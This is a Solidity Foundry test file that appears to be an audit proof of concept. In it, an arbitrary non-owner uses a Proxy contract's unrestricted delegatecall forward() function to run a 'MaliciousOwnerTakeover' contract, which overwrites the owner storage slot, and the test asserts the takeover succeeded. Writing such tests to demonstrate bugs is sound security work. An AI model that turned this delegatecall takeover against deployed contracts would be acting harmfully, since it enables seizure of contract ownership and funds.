
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

// Malicious contract that will be called via delegatecall to take over ownership
contract MaliciousOwnerTakeover {
    // Storage slot 0 matches the owner slot in Proxy contract
    address owner;
    
    function takeOver(address newOwner) external {
        owner = newOwner;
    }

    receive() external payable {}

    fallback() external payable {}
}

contract TestAccessControlProxy is Test {
    Proxy public proxy;
    MaliciousOwnerTakeover public malicious;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        proxy = new Proxy();
        malicious = new MaliciousOwnerTakeover();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // CRITICAL - Exclude the owner (the only privileged role)
        // The owner is set to msg.sender in constructor, which is this test contract
        vm.assume(caller != originalOwner);

        // --- 2. State Configuration ---
        // No special state configuration needed for this test
        // The forward function doesn't require value or special state

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // An arbitrary user can call forward() with delegatecall to execute arbitrary code
        // in the context of the Proxy contract. This allows them to modify the owner storage.
        bytes memory attackData = abi.encodeWithSelector(
            MaliciousOwnerTakeover.takeOver.selector,
            caller
        );
        
        // This call should succeed even though caller is not the owner
        // demonstrating the unrestricted access vulnerability
        proxy.forward(address(malicious), attackData);

        // ASSERT SUCCESS - Verify the ownership was actually changed
        // Read the owner storage slot (slot 0) to confirm the attack worked
        bytes32 newOwnerSlot = vm.load(address(proxy), bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(newOwnerSlot)));
        
        // The owner should now be the arbitrary caller, proving the vulnerability
        assertEq(newOwner, caller, "Arbitrary user should have taken ownership via delegatecall");
    }

    receive() external payable {}

    fallback() external payable {}
}

// Simple contract for testing that forward can be called
contract DummyTarget {
    function doNothing() external pure {}

    receive() external payable {}

    fallback() external payable {}
}
